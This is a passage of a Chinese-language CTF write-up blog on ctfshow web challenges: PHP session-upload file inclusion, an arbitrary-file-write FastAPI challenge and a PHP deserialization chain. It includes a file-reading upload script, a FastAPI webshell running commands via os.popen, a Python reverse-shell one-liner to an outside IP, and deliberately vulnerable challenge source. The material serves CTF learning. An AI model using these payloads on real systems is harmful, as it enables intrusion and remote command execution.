class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>sessionæ–‡ä»¶çš„åå­—å°±æ˜¯sess_PHPSESSID<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/2.png" class="" title="alt text"><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/1.png" class="" title="alt text"><br>å¯ä»¥å‘ç°æˆåŠŸgetshell</p><h2 id="æ³•äºŒ-åˆ©ç”¨dockerè£¸æ–‡ä»¶ä¸Šä¼ -åŠ æ–‡ä»¶åŒ…å«-getshell"><a href="#æ³•äºŒ-åˆ©ç”¨dockerè£¸æ–‡ä»¶ä¸Šä¼ -åŠ æ–‡ä»¶åŒ…å«-getshell" class="headerlink" title="æ³•äºŒ åˆ©ç”¨dockerè£¸æ–‡ä»¶ä¸Šä¼  åŠ æ–‡ä»¶åŒ…å« getshell"></a>æ³•äºŒ åˆ©ç”¨dockerè£¸æ–‡ä»¶ä¸Šä¼  åŠ æ–‡ä»¶åŒ…å« getshell</h2><p>è¿™ä¸ªdockerè£¸æ–‡ä»¶ä¸Šä¼ å…¶å®æˆ‘å¾ˆæ—©ä¹‹å‰å°±å¼€äº†ä¸€ç¯‡åšå®¢æƒ³è¦å­¦ä¹ ä½†ä¸€ç›´æ²¡å­¦ï¼Œç°åœ¨å¡«ä¸€ä¸‹å‘<a href="../../../../2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/">docker phpè£¸æ–‡ä»¶ä¸Šä¼ </a></p><p>åˆ©ç”¨æ–¹æ³•å†™åœ¨äº†ä¸Šè¿°æ–‡ç« é‡Œ<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/3.png" class="" title="alt text"><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/4.png" class="" title="alt text"></p><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/5.png" class="" title="alt text"><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/6.png" class="" title="alt text"><h1 id="download"><a href="#download" class="headerlink" title="download"></a>download</h1><h1 id="easy-api"><a href="#easy-api" class="headerlink" title="easy_api"></a>easy_api</h1><p>æ‰“å¼€openapi.jsonå¯ä»¥çœ‹åˆ°api<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/17.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼šå‘ç°æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶æŸ¥çœ‹ã€‚å’ŒlistæŸ¥çœ‹æ–‡ä»¶<br>ä½†æ˜¯åœ¨æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åå¼€å¤´ä¸º/ä¼šå‘ç°æŸ¥çœ‹listæ˜¾ç¤ºæˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯æ— æ³•ä½¿ç”¨uloadsæ¥æŸ¥çœ‹ä¼šæ˜¾ç¤ºæŸ¥æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬çŒœæµ‹å…¶ä¸Šä¼ åçš„è·¯å¾„å¹¶ä¸ä¼šæ›´æ”¹ï¼Œä½†æ— æ³•ä¸Šä¼ åˆ°æ ¹ç›®å½•ï¼Œä½†æ˜¯uploadsä»ç„¶ä¼šåŸè·¯è¿”å›çš„å¯»æ‰¾è¯¥è·¯å¾„æ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸º/etc/passwdçš„ä¸ä¹…å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹äº†å—?<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/24.png" class="" title="alt text"><br>ç»è¿‡å°è¯•ä¼šå‘ç°æˆåŠŸè¯»å–åˆ°etcpasswdçš„éƒ¨åˆ†å†…å®¹</p><p>ç»è¿‡è¯»å–ç¯å¢ƒå˜é‡å’ŒcmdlineçŸ¥é“å…¶è¿è¡Œç›®å½•ä¸º<code>ctfshowsecretdir</code>,è„šæœ¬åä¸ºctfshow2024secret.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://f7d1a2a2-7256-4615-a8ad-135ffcde7a9b.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">path</span>):</span><br><span class="line">    r = requests.post(url+<span class="string">&#x27;upload/&#x27;</span>, files=&#123;<span class="string">&quot;file&quot;</span>:(path,<span class="string">&quot;LSE&quot;</span>)&#125;,verify=<span class="literal">False</span>)</span><br><span class="line">    filename = re.search(<span class="string">r&#x27;&quot;fileName&quot;:&quot;(.+)&quot;&#x27;</span>, <span class="built_in">str</span>(r.text)).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uploads</span>(<span class="params">fileName</span>):</span><br><span class="line">    r = requests.get(url+<span class="string">&quot;uploads/&quot;</span>+fileName, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    path=<span class="string">&quot;/proc/&quot;</span>+<span class="built_in">str</span>(pid)+<span class="string">&quot;/environ&quot;</span></span><br><span class="line">    <span class="comment">#path=&#x27;/ctfshowsecretdir/ctfshow2024secret.py&#x27;</span></span><br><span class="line">    filename=upload(path)</span><br><span class="line">    uploads(filename)</span><br></pre></td></tr></table></figure><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/25.png" class="" title="alt text"></p><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/26.png" class="" title="alt text"><p>åœ¨æˆ‘ä»¬å°è¯•æ¥æŸ¥çœ‹æºç æ—¶ä¼šå‘ç°webç›´æ¥å´©äº†,å³æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ç›´æ¥å°†åç«¯çš„ctfshow2024secret.pyç»™è¦†ç›–äº†,æ—¢ç„¶æ˜¯è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¸Šä¼ é©¬æ¥è¿›è¡Œrec<br>å› ä¸ºè¿™ä¸ªæ˜¯fastapiåŠ uvicornå½¢å¼çš„æºç æ‰€ä»¥æˆ‘ä»¬è¦å†™ä¸€ä¸ªapié©¬æ¥è¿›è¡Œè¦†ç›–<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uvicorn,os</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> *</span><br><span class="line">&#123;app&#125; = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@&#123;app&#125;.get(<span class="params"><span class="string">&quot;/s&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">c</span>):</span><br><span class="line">  os.popen(c)</span><br></pre></td></tr></table></figure><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/27.png" class=""></p><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/28.png" class="" title="alt text"><p>ç”±äºä¸Šä¼ ä¸Šçº¿æ˜¯100ä¸ªå­—ç¬¦æ‰€ä»¥æˆ‘ä»¬åªèƒ½ä¸Šä¼ è¿™ä¸ªæ— æ³•å›æ˜¾çš„å°é©¬ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åå¼¹shellã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s?c=python%20-c%20&#x27;import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22111.xxx.xxx.xxx%22%2C7777))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)&#x27;</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿå¯ä»¥å°è¯•å…ˆä¸Šä¼ å¦‚ä¸‹ä»£ç åˆ°/ctfshowsecretdir/k.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uvicorn,os</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> *</span><br><span class="line">app = FastAPI()</span><br></pre></td></tr></table></figure><br>åœ¨ä¸Šä¼ å¦‚ä¸‹æ–‡ä»¶åˆ°/ctfshowsecretdir/ctfshow2024secret.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> k <span class="keyword">import</span> *</span><br><span class="line">app = FastAPI()</span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/s&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">c</span>):</span><br><span class="line">    r=os.popen(c).read()</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure><br>å°†å¯¼å…¥å„ä¸ªåº“çš„ä»£ç ç¼©å‡æˆäº†å¯¼å…¥kè¿™å¯¼è‡´äº†æ­£å¥½å¯ä»¥å¤šåŠ ä¸€ä¸ªreadå‡½æ•°å’Œreturnç»“æœä½¿å¾—å¯ä»¥å›æ˜¾<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/29.png" class="" title="alt text"><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/30.png" class="" title="alt text"></p><h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h1><p>è¿™é¢˜æ˜¯åº”è¯¥phpååºåˆ—åŒ–ï¼Œè¯¥é¢˜ç”¨åˆ°äº†ä¸å°‘çš„tirckï¼Œç®—æ˜¯å›å¿†äº†ä¸€ä¸‹å§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Chu0</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;waf1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show/i&#x27;</span>, <span class="variable">$Chu0</span>))</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;waf2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_in_waf_php</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$a</span>,<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hinthinthint,base64å–”&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;fastfast&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0 = <span class="string">&#x27;xiuxiuxiu&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ç»•ä¸€ä¸‹å§å­©å­&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¼€èƒƒå°èœï¼Œå°±è®©æˆ‘æˆä¸ºç­¾åˆ°é¢˜å­&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;WAF,å¯åŠ¨ï¼&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¢«wafå•¦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè‡ªç„¶æ˜¯åˆ†æé“¾å­äº†ï¼Œè¿™ä¸ªæ¯”è¾ƒç®€å•è¿‡ç¨‹å°±æ˜¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf::__destruct-&gt;show::call-&gt;Chu0_write::__tostrinf</span><br></pre></td></tr></table></figure><br>ä¹‹åå°±æ˜¯ç»•wafäº†<br>é¦–å…ˆwafæˆ‘ä»¬ä¼šå‘ç°å…¶ä¼ çš„å‚æ•°æ˜¯<code>$_REQUEST</code>è¿™ä¸ªä¼ å‚ä½†getå’Œpostä¼ åŒä¸€å‚æ•°åªä¼šæ¥å—POSTçš„æ‰€ä»¥æˆ‘ä»¬åœ¨POSTä¼ ä¸ªåŒä¸€å‚æ•°ä¸º1å³å¯ã€‚<br>ç„¶åæ˜¯waf2<br>å› ä¸ºå‚æ•°æ˜¯<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>å³GETä¼ å‚?åçš„å€¼<br>é‚£ä¹ˆåªè¦urlç¼–ç åå³å¯ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢é‚£ä¸ªwafå¯ä»¥ä½¿ç”¨Cå¤´æ¥ç»•è¿‡ï¼Œè€Œä¸”Cå¤´å¯ä»¥ç»•è¿‡__weakup expä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h1=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h2=<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="keyword">new</span> <span class="title class_">Chu0_write</span>()));</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span 